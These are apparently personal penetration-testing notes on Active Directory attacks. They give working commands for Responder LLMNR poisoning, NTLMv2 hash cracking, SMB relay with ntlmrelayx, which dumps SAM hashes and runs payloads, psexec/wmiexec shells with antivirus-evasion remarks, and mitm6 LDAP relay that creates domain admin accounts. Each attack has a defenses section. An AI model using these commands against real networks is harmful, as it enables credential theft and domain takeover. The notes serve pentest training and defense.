
	-> We will be abusing the windows features to get access to user accounts,credentials and machines as well.

	Great article: https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa

	Enumerating usernames(using rids) (crackmapexec):
		>crackmapexec smb [domain] -u [username] -p [password] --rid-brute
		-> Using guest user to enumerate usernames
			>crackmapexec smb vulnnet-rst.local -u guest -p '' --rid-brute

	LLMNR Poisoning:
		What is LLMNR?
			-> The Link-Local Multicast Name Resolution is a protocol based on the Domain Name System packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link.
			-> It is used to identify hosts when DNS fails to do so.
			-> Previously it was called NBT-NS (NetBIOS Name service)
			-> key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to.

		Overview: 
			-> The victim sends a query asking the server "I want to connect to the \\hackm."
			-> The actual server name was hackme but the user has happened to type something wrong causing a DNS issue
			-> The server replies I dont know what the heck you are talking about.
			-> The message is broadcasted to everyone asking "does anyone know who the \\hackm server is?"
			-> Actually, its a man in the middle attack. We as an attacker happens to listen on the network, responds to the victim saying "I know exactly where the server is. Send me you hash and I will connect you with it"
			-> victim is just gonna say, "Here, you go, here is my hash."
			-> So, we as an attacker, sitting on the network, listening for such requests, and running a tool called responder.
		
		Responder:
			-> Responder is a tool from impacker suite.
			>responder -I [interface] -wd
			-> This is the first tool which is run on the engagements in the morning or just after lunch because it requires a lots of traffic when people try to access servers.
			-> So, we are waiting for the responses and capturing hashes.

		Attack Strategy:
			-> By mistake someone types wrong network drive: \\10.0.8.2 , a dns issue occurs, a broadcast message goes over the network, we respond to the message and in response from the victim, we get the hash. 
			-> First thing we will do is, we will try to crack the hash.
			>hashcat -m 5600 hashes.txt rockyou.txt
			-> So less complex the password or easy to guess to, we are better off at cracking.

		Cracking:
			>john hashes.txt --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
			>hashcat -m 5600 [hashfile] [wordlist-file] --force 
				-> --force switch when you are running on a vm and you don't have a graphics card. Might work sometimes on some machines.
			-> Use hashcat on your base OS.
			-> If running on a base OS:
				>hashcat -m 5600 hashfile wordlist -O
					-O if for optimize. so the cracking will go little faster.

		Defenses:
			-> the best defense against this attack is to turn of LLMNR and NBT-NS.
			-> Remember, if LLMNR is turned off, and DNS resolution fails, it will use NBT-NS. So better turn it off both.
				-> To disable LLMNR, select "Turn OFF multicast name resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS client in the Group Policy Editor.
				-> To disable NBT-NS, navigate to network connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced Tab > WINS Tab > and select "Disable NetBIOS over TCP/IP."

			-> If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
				-> Require Network Access Control
				-> Require strong user passwords (eg: > 14 characters in length and limit common word usage), the more complex and long the password, the harder for an attacker to crack the hash.



	SMB Relay attacks:
		What is SMB Relay?
			-> Instead of cracking hashes with the responder, we can instead relay those hashes to specific machines and gain access.

		Requirements:
			-> SMB Signing must be disabled on the target.
				Note: Remember smb signing is enabled by default on server and disabled by default on workstations.
			-> Relayed user credentials must be admin on machine. 

		Steps:
			-> edit the responder.conf and turn off http and smb. (/etc/responder/Responder.conf)
			-> run responder
			-> setting up relay:
				-> python ntlmrelayx.py -tf targets.txt -smb2support
			-> an event occurs
				-> responder responds to the event, captures the hash, ntlmrelayx relays the hash to the target, if the user is also an admin on another machine, then it will dump sam database of the other machine.
				-> now with the captured hashes, we can either try to crack them or pass them to other machines to try to gain access.

		Discovering hosts with SMB signing disabled:
			-> One method to go for is NESSUS scan. It will tell you nice and easy which hosts have smb signing disabled.
			-> Second method is using nmap's script for smb signing
				>nmap --script=smb2-security-mode.nse -p445 [IP or IPs]

				Host script results:
				| smb2-security-mode: 
				|   3.1.1: 
				|_    Message signing enabled but not required

				The above output means that, we can still relay hashes as the signing is not required.
			-> Last method is to go to github and look for smb signing check.

		Attack:
			-> Make a list of ips whose message signing is enabled but not required and save them into a text file.
			-> Now, we will relay the hash captured from one computer to another computer.
			-> First, edit the Responder.conf file and turn smb and http to Off.
			-> Run the responder: responder -I eth0 -dw
			-> Run ntlmrelayx.py: ntlmrelayx.py -tf targets.txt -smb2support
			-> Trigger a smb event by pointing to your machine. Wait for ntlmrelayx to relay the hash and it will dump the sam database.
			-> Copy the hashes, you can either crack them or move laterally with these hashes.

			Getting an SMB shell:
				-> Follow the same steps until running ntlmrelayx.py.
				-> Now, we will add an -i flag for interactive in ntlmrelayx.py program.
				-> Once it successfully relays the hash, it will open up a port locally which we can interact with using nc. It will basically be an smb shell. 
				-> basic commands in smb share:
					>help - help menu
					>shares - lists shares
					>use {sharename} - interact with a share.


			Getting a meterpreter session in metasploit:
				-> Follow the same steps until running ntlmrelayx.py.
				-> Now generate a payload using msfvenom according to the target's architecture.
				-> Now, we will add an -e flag to tell ntlmrelayx.py to execute a file for us:
					ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe
				-> Fire up msfconsole, set up a listerner and wait for the ntlmrelayx to execute the file.
				-> Hopefully, you will receive the connection back.

			Executing commands with ntmlrelayx.py:
				-> Use -c command followed by the command you want to execute. 
				-> You can also execute a powershell command by using -c flag.

		Defenses:
			1. Enable SMB signing on all devices:
				Pro: Completely stops the attack.
				Con: Can cause performance issues with file copies.
			2. Disable NTLM authentication on network
				Pro: Completely stops the attack.
				Con: If Kerberos stops working, Windows defaults back to NTLM.
			3. Account tiering:
				Pro: Limits domain admins to specific tasks (eg. only log onto servers with need for DA).
				Con: Enforcing the policy may be difficult.
			4. Local admin restriction:
				Pro: Can prevent a lot of lateral movement.
				Con: Potential increase in the amount of service desk tickets.
			

	Gaining Shell Access:
		Using metasploit:
			>msfconsole
			>use exploit/windows/smb/psexec
			>set rhosts [target-ip]
			>set smbdomain [domain-name]
			>set smbpass [password]
			>set smbuser fcastle
			>set payload windows/x64/meterpreter/reverse_tcp
			>set lhost [interface]
			>set lport [local-port]
			>run

			Note: This psexec module might or might not work.
			-> psexec is more of a noisy ones against the antivirus.
			-> If using target as "Native Upload" or powershell, the windows AV was able to detect it.

		Using Impacket tools:
			>psexec.py [domain name]/[username]:[password]@[remote-ip]
			>wmiexec.py [domain name]/[username]:[password]@[remote-ip]
			>smbexec.py [domain name]/[username]:[password]@[remote-ip]

			Note: psexec.py shell was also picked up by windows defender and wmiexec and smbexec didn't work.

		Protip: start with wmiexec or smbexec and then move to psexec.
		Observation: When Windefend was turned off, both psexec.py and smbexec.py worked except wmiexec.


	IPv6 attacks:
		Overview:
			-> Most reliable attack these days.
			-> If we are utilizing IPv4 and IPv6 is turned on, then who is doing DNS for IPv6? Answer is Mr nobody.
			-> We will set up an attacking machine by spoofing the DNS server and receiving all the IPv6 requests to me. 
			-> If this happens, we can get access to DC, via LDAP or SMB.
			-> On reboot, a event will be trigerred, and with the help of it we will log into DC without even requiring to be an admin and gather more information from the DC.
			-> When any user logs into the network, that authentication comes to us (the attacking machine) in the form of NTLM, and we will relay this to DC which is called LDAP relay.
			-> If we login as an Domain administrator, it creates an account for us. 
			-> For all this to happen, we will be using a tool called mitm6. 

			What is LDAP?
				LDAP (Lightweight Directory Access Protocol) is one of the core protocols that was developed for directory services (the process of securely managing users and their access rights to IT resources), and most directory services still use LDAP today, although they may also use additional protocols like Kerberos, SAML, RADIUS, SMB, Oauth, and others.

		IPv6 DNS takeover via mitm6:
			Resources: 
				mitm6: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
				Combining NTLM relays and kerberos delegation: https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/

			starting mitm6:
				>mitm6 -d marvel.local
			starting ntlmrelayx.py:
				>ntlmrelayx.py -6 -t ldaps://10.0.2.41 -wh fakewpad.marvel.local -l lootme
					-6 means only for ipv6
					ldaps means ldap secure because most environments are running ldaps.
					-l is for loot.

			Note: ipv6 sends out a message saying where is my dns about every 30 minutes, so rebooting the target will speed up this process.

			-> A new directory will be created with lootme name and inside that there will be various information captured from the domain like the users, groups, policies, etc.
			-> Use firefox to open up the html files and look for sensitive information.

			-> Now, when an admin logs into any of the computers, you will notice, ntlmrelayx will succeed in authenticating as administrator to ldap, and it will create a new user for you, with domain admin privileges.
			-> Check out the resource to read more about the delegate attacks.

		IPv6 attack defenses:
			Mitigation Strategies:
				1. IPv6 poisoning abuises the fact that Windows queries for an IPv6 address in IPv4-only environments. If you don't use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
					a. (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-In)
					b. (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
					c. (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)

				2. If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.

				3. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding. 

				4. Consider Administrative users to Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.


	Passback Attacks:
		Resource: 
			A pentester's guide to Printer hacking:
				https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/

		-> Try to use this attack in your internal pentests.


	Other Attack vectors and strategies:
		1. Begin day with mitm6 or Responder.
		2. Run scans to generate traffic.
		3. If scans are taking too long, look for websites in scope (http_version - metasploit module)
		4. Look for default credentials on weblogins:
			-> printers
			-> Jenkins etc.
		5. Think outside the box.

		